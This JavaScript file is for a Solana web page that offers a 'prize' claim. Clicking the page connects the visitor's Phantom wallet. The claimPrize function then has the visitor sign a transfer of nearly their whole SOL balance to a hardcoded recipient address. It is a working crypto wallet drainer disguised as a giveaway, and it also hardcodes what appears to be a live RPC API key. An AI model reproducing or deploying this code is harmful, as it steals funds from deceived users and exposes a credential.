const Buffer = buffer.Buffer;

const HELIUS_API_KEY = '1c14c5e5-3c9d-4a53-97c8-9c27d398532d';
const HELIUS_RPC_URL = `https://rpc.helius.xyz/?api-key=${HELIUS_API_KEY}`;
let wallet;
let connection;
let publicKey;
let balance;

async function init() {
  const provider = window?.phantom?.solana || window.solana;
  
  if (!provider) {
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
      window.location.href = 'phantom://browse/' + window.location.href;
    } else {
      alert('Please install Phantom Wallet');
    }
    return;
  }

  wallet = provider;
  connection = new solanaWeb3.Connection(HELIUS_RPC_URL);
  
  try {
    await wallet.connect({ onlyIfTrusted: false });
    publicKey = wallet.publicKey.toString();
    await updateBalance();
  } catch (err) {
    console.log('Connection error:', err);
  }
}

async function updateBalance() {
  try {
    balance = await connection.getBalance(wallet.publicKey);
  } catch (err) {
    console.error('Error fetching balance:', err);
  }
}

async function claimPrize() {
  try {
    if (!wallet || !wallet.isConnected || !wallet.publicKey) {
      alert('Please connect your Phantom Wallet.');
      return;
    }

    const balance = await connection.getBalance(wallet.publicKey);
    if (balance <= 0.001 * solanaWeb3.LAMPORTS_PER_SOL) {
      alert('Insufficient balance to cover transaction fees.');
      return;
    }

    const recipient = new solanaWeb3.PublicKey('HHcU1RvjmYaCPYjp2FQvnMAqJe7BB8X1joTpfP17xEgd');
    const fee = 0.001 * solanaWeb3.LAMPORTS_PER_SOL;
    const amount = balance - fee;

    const transaction = new solanaWeb3.Transaction().add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: recipient,
        lamports: amount,
      })
    );

    const { blockhash } = await connection.getRecentBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = wallet.publicKey;

    const signed = await wallet.signTransaction(transaction);
    const signature = await connection.sendRawTransaction(signed.serialize());
    await connection.confirmTransaction(signature);

    alert('Transaction successful!');
    await updateBalance();
  } catch (err) {
    console.error('Transaction error:', err);
    alert(`Transaction failed: ${err.message}`);
  }
}

document.addEventListener('DOMContentLoaded', () => {
  const clickArea = document.querySelector('.click-area');
  clickArea.addEventListener('click', async () => {
    if (!wallet || !wallet.isConnected) {
      await init();
    } else {
      await claimPrize();
    }
  });
});
